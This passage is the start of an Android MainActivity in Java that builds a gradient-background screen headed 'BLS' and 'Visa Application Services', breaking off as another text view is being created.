package com.bls.rendezvous;

import android.app.Activity;
import android.os.Bundle;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.widget.*;
import android.view.Gravity;
import android.view.ViewGroup;
import android.util.TypedValue;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        int[] colors = {Color.parseColor("#2D1B69"), Color.parseColor("#3B2A8A"), Color.parseColor("#2E86AB"), Color.parseColor("#00C9A7")};
        GradientDrawable bg = new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM, colors);
        
        ScrollView scroll = new ScrollView(this);
        LinearLayout main = new LinearLayout(this);
        main.setOrientation(LinearLayout.VERTICAL);
        main.setGravity(Gravity.CENTER_HORIZONTAL);
        main.setPadding(dp(24), dp(60), dp(24), dp(40));
        main.setBackground(bg);

        TextView bls = new TextView(this);
        bls.setText("BLS");
        bls.setTextSize(90);
        bls.setTextColor(Color.WHITE);
        bls.setGravity(Gravity.CENTER);
        bls.setTypeface(null, android.graphics.Typeface.BOLD);
        main.addView(bls);

        TextView sub = new TextView(this);
        sub.setText("Visa Application Services");
        sub.setTextSize(20);
        sub.setTextColor(Color.WHITE);
        sub.setGravity(Gravity.CENTER);
        sub.setPadding(0, dp(5), 0, dp(8));
        main.addView(sub);

        TextView secure = new Text
